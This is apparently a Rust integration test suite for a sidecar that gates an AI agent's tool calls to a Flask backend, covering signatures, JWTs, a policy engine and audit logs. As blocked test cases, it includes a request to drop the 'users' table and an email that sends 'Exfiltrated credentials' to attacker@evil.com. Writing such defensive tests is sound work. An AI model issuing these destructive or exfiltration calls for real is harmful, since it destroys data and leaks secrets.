#[tokio::test]
async fn test_live_flask_direct_unauthenticated_requests_blocked_with_401() {
    let flask = FlaskProcessGuard::spawn(TEST_SIDECAR_SECRET).await;
    let base_url = format!("http://127.0.0.1:{}", flask.port);
    let client = reqwest::Client::new();

    // 1. Healthz should return 200 without authentication
    let res = client
        .get(format!("{base_url}/healthz"))
        .send()
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    let json: serde_json::Value = res.json().await.unwrap();
    assert_eq!(json["status"], "ok");

    // 2. GET /api/v1/system/status without headers returns 401
    let res = client
        .get(format!("{base_url}/api/v1/system/status"))
        .send()
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::UNAUTHORIZED);
    let err: serde_json::Value = res.json().await.unwrap();
    assert_eq!(err["error"], "unauthorized");
    assert!(err["reason"].as_str().unwrap().contains("Missing"));

    // 3. POST /api/v1/email/send without headers returns 401
    let res = client
        .post(format!("{base_url}/api/v1/email/send"))
        .json(&json!({"to": "alice@ourcompany.com", "body": "Direct attempt"}))
        .send()
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::UNAUTHORIZED);

    // 4. POST /api/v1/db/drop without headers returns 401
    let res = client
        .post(format!("{base_url}/api/v1/db/drop"))
        .json(&json!({"table": "users"}))
        .send()
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_live_flask_direct_rust_signed_requests_accepted_with_200() {
    let flask = FlaskProcessGuard::spawn(TEST_SIDECAR_SECRET).await;
    let base_url = format!("http://127.0.0.1:{}", flask.port);
    let client = reqwest::Client::new();

    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs();

    // 1. Test POST /api/v1/system/status with valid Rust signature
    let payload = json!({"service": "core"});
    let payload_bytes = serde_json::to_vec(&payload).unwrap();
    let signature = sign_payload(TEST_SIDECAR_SECRET.as_bytes(), now, &payload_bytes);

    let res = client
        .post(format!("{base_url}/api/v1/system/status"))
        .header(HEADER_TIMESTAMP, now.to_string())
        .header(HEADER_SIGNATURE, signature)
        .header(header::CONTENT_TYPE, "application/json")
        .body(payload_bytes)
        .send()
        .await
        .unwrap();

    assert_eq!(res.status(), StatusCode::OK);
    let json: serde_json::Value = res.json().await.unwrap();
    assert_eq!(json["status"], "healthy");
    assert_eq!(json["service"], "core");

    // 2. Test POST /api/v1/email/send with valid Rust signature
    let email_payload = json!({
        "to": "alice@ourcompany.com",
        "subject": "System Notice",
        "body": "Operational check passed."
    });
    let email_bytes = serde_json::to_vec(&email_payload).unwrap();
    let email_sig = sign_payload(TEST_SIDECAR_SECRET.as_bytes(), now, &email_bytes);

    let res = client
        .post(format!("{base_url}/api/v1/email/send"))
        .header(HEADER_TIMESTAMP, now.to_string())
        .header(HEADER_SIGNATURE, email_sig)
        .header(header::CONTENT_TYPE, "application/json")
        .body(email_bytes)
        .send()
        .await
        .unwrap();

    assert_eq!(res.status(), StatusCode::OK);
    let json: serde_json::Value = res.json().await.unwrap();
    assert_eq!(json["status"], "sent");
    assert_eq!(json["to"], "alice@ourcompany.com");
}

#[tokio::test]
async fn test_live_flask_end_to_end_route_b_forwarding_and_policy_chokepoints() {
    let flask = FlaskProcessGuard::spawn(TEST_SIDECAR_SECRET).await;
    let flask_url = format!("http://127.0.0.1:{}", flask.port);

    // Configure sidecar targeting the live background Flask instance
    let mut config = Config::for_test(TEST_SIDECAR_SECRET, TEST_JWT_SECRET);
    config.flask_backend_url = flask_url.clone();

    let policy_engine = PolicyEngine::from_file("policy.toml").expect("Valid policy.toml");
    let decision_engine =
        Arc::new(SyntheticKevEngine::for_cpu().expect("Valid SyntheticKevEngine"));
    let (audit_logger, captured_logs) = AuditLogger::capture();

    let state = AppState::test_state(config, policy_engine, decision_engine, audit_logger);
    let app = create_router(state);

    let now_ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs();
    let exp = (now_ts + 300) as usize;

    // -------------------------------------------------------------------------
    // Scenario A: Approved tool call forwards through Axum Route B -> Flask -> 200
    // -------------------------------------------------------------------------
    let tool_req = ToolExecuteRequest {
        session_id: "sess-live-001".to_string(),
        endpoint: "/api/v1/system/status".to_string(),
        method: "POST".to_string(),
        payload: serde_json::from_value(json!({"service": "worker-service"})).unwrap(),
        context: Default::default(),
    };
    let raw_tool_body = serde_json::to_vec(&tool_req).unwrap();
    let payload_sha = crypto::compute_payload_sha256(&raw_tool_body);

    let token = mint_agent_jwt_with_exp(
        "agent-007",
        "agent",
        Some(&payload_sha),
        exp,
        TEST_JWT_SECRET.as_bytes(),
    )
    .unwrap();

    let response = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/execute")
                .header(header::AUTHORIZATION, format!("Bearer {token}"))
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from(raw_tool_body))
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(response.status(), StatusCode::OK);
    let body_bytes = axum::body::to_bytes(response.into_body(), usize::MAX)
        .await
        .unwrap();
    let res_json: serde_json::Value = serde_json::from_slice(&body_bytes).unwrap();
    assert_eq!(res_json["status"], "healthy");
    assert_eq!(res_json["service"], "worker-service");

    // -------------------------------------------------------------------------
    // Scenario B: Approved email call forwards through Axum Route B -> Flask -> 200
    // -------------------------------------------------------------------------
    let email_req = ToolExecuteRequest {
        session_id: "sess-live-002".to_string(),
        endpoint: "/api/v1/email/send".to_string(),
        method: "POST".to_string(),
        payload: serde_json::from_value(json!({
            "to": "alice@ourcompany.com",
            "body": "System diagnostics nominal."
        }))
        .unwrap(),
        context: Default::default(),
    };
    let email_tool_body = serde_json::to_vec(&email_req).unwrap();
    let email_sha = crypto::compute_payload_sha256(&email_tool_body);

    let email_token = mint_agent_jwt_with_exp(
        "agent-007",
        "agent",
        Some(&email_sha),
        exp,
        TEST_JWT_SECRET.as_bytes(),
    )
    .unwrap();

    let response = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/execute")
                .header(header::AUTHORIZATION, format!("Bearer {email_token}"))
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from(email_tool_body))
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(response.status(), StatusCode::OK);
    let body_bytes = axum::body::to_bytes(response.into_body(), usize::MAX)
        .await
        .unwrap();
    let res_json: serde_json::Value = serde_json::from_slice(&body_bytes).unwrap();
    assert_eq!(res_json["status"], "sent");
    assert_eq!(res_json["to"], "alice@ourcompany.com");

    // -------------------------------------------------------------------------
    // Scenario C: Blocked endpoint (/api/v1/db/drop) rejected at sidecar (HTTP 403)
    // Flask is NEVER contacted for unauthorized calls.
    // -------------------------------------------------------------------------
    let drop_req = ToolExecuteRequest {
        session_id: "sess-live-003".to_string(),
        endpoint: "/api/v1/db/drop".to_string(),
        method: "POST".to_string(),
        payload: serde_json::from_value(json!({"table": "users"})).unwrap(),
        context: Default::default(),
    };
    let drop_tool_body = serde_json::to_vec(&drop_req).unwrap();
    let drop_sha = crypto::compute_payload_sha256(&drop_tool_body);

    let drop_token = mint_agent_jwt_with_exp(
        "agent-007",
        "agent",
        Some(&drop_sha),
        exp,
        TEST_JWT_SECRET.as_bytes(),
    )
    .unwrap();

    let response = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/execute")
                .header(header::AUTHORIZATION, format!("Bearer {drop_token}"))
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from(drop_tool_body))
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(response.status(), StatusCode::FORBIDDEN);
    let body_bytes = axum::body::to_bytes(response.into_body(), usize::MAX)
        .await
        .unwrap();
    let res_json: serde_json::Value = serde_json::from_slice(&body_bytes).unwrap();
    assert_eq!(res_json["decision"], "deny");
    assert_eq!(res_json["error"], "EndpointDenied");

    // -------------------------------------------------------------------------
    // Scenario D: Constraint violation (regex non-company email) rejected at sidecar (HTTP 403)
    // -------------------------------------------------------------------------
    let evil_email_req = ToolExecuteRequest {
        session_id: "sess-live-004".to_string(),
        endpoint: "/api/v1/email/send".to_string(),
        method: "POST".to_string(),
        payload: serde_json::from_value(json!({
            "to": "attacker@evil.com",
            "body": "Exfiltrated credentials."
        }))
        .unwrap(),
        context: Default::default(),
    };
    let evil_body = serde_json::to_vec(&evil_email_req).unwrap();
    let evil_sha = crypto::compute_payload_sha256(&evil_body);

    let evil_token = mint_agent_jwt_with_exp(
        "agent-007",
        "agent",
        Some(&evil_sha),
        exp,
        TEST_JWT_SECRET.as_bytes(),
    )
    .unwrap();

    let response = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/execute")
                .header(header::AUTHORIZATION, format!("Bearer {evil_token}"))
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from(evil_body))
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(response.status(), StatusCode::FORBIDDEN);
    let body_bytes = axum::body::to_bytes(response.into_body(), usize::MAX)
        .await
        .unwrap();
    let res_json: serde_json::Value = serde_json::from_slice(&body_bytes).unwrap();
    assert_eq!(res_json["decision"], "deny");
    assert_eq!(res_json["error"], "ConstraintFailed");

    // -------------------------------------------------------------------------
    // Scenario E: Audit log verification
    // -------------------------------------------------------------------------
    let logs = captured_logs.lock().unwrap();
    assert_eq!(logs.len(), 4);
    assert_eq!(logs[0].decision, "allow");
    assert_eq!(logs[1].decision, "allow");
    assert_eq!(logs[2].decision, "deny");
    assert_eq!(logs[3].decision, "deny");
}
